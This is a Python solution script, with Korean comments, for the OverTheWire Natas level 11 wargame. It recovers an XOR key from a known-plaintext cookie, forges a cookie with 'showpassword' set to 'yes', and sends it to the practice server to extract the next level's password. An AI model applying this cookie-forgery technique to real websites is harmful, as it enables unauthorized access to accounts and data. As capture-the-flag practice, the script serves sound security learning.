import re
from requests import request as req
import base64


def find_key(original: bytes, decoded: bytes):
    """
    A XOR B = C == C XOR B = A 이기 때문에
    원본데이터 XOR key = 결과를
    결과 XOR 원본데이터 = key를 가져온다
    크기가 같은 decoded, original 1:1로 매핑시켜 XOR 연산
    """
    return bytes([d ^ o for d, o in zip(decoded, original)]).decode()[0:4]


def xor_encrypt(msg: str, key: str) -> str:
    """
    key를 기반으로 msg를 xor_encrypt 후 base64 인코딩 결과 반환
    """
    encrypted = "".join(
        [chr(ord(msg[idx]) ^ ord(key[idx % len(key)])) for idx, _ in enumerate(msg)]
    )

    return base64.b64encode(encrypted.encode()).decode()


def get_flag(data: str, user_password: str):
    """
    서버에 변조한 쿠키를 심어서 요청
    """
    res = req(
        method="GET",
        url=f"http://natas11.natas.labs.overthewire.org",
        auth=("natas11", user_password),
        cookies={"data": data},
    )

    matched = re.search("(?<=natas12 is )\\w+", res.text)

    return matched.group() if matched else "NO FLAG"


def main():
    # 처음 요청 시 받아오는 {"showpassword":"no","bgcolor":"#ffffff"} 값일 때 꺼내 온 쿠키 값
    decoded = base64.b64decode(
        "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg="
    )

    key = find_key(
        original=b'{"showpassword":"no","bgcolor":"#ffffff"}', decoded=decoded
    )

    # 다음 비밀번호를 받을 수 있게 showpassword를 yes로 바꿔 xor encrypt
    cookie_data = xor_encrypt(msg='{"showpassword":"yes","bgcolor":"#ffffff"}', key=key)

    flag = get_flag(cookie_data, "UJ...Ek")

    print(flag)


main()
